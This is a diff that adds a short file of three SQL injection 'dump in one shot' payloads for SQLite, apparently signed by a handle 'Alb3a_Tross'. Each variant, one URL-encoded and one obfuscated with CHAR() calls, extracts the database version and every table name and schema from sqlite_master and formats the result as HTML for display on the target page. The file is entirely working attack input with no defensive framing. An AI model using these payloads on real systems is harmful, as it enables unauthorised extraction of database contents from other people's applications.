@@ -1,0 +1,21 @@
+Dios:-1
+
+(Select Group_Concat('<i><br> Alb3a_Tross <br>'%7C%7C sqlite_version()%7C%7C (SELECT Group_Concat('<li>'%7C%7C Name %7C%7C '~~>' %7C%7C sql))))
+
+From sqlite_master
+
+
+Dios:-2
+
+CHAR(65,108,98,51,97,95,84,114,111,115,115,32,60,108,105,62)||sqlite_version()||CHAR(60,108,105,62)||group_concat(CHAR(60,108,105,62)||tbl_name||CHAR(32,58,58,58,32)||sql)
+
+from sqlite_master
+
+
+Dios:-3
+
+'<b><i> Alb3a_Tross <li>'||sqlite_version()
+
+Group_Concat('<li><b>'||tbl_name||' >>> '||sql)
+
+ from sqlite_master--+-
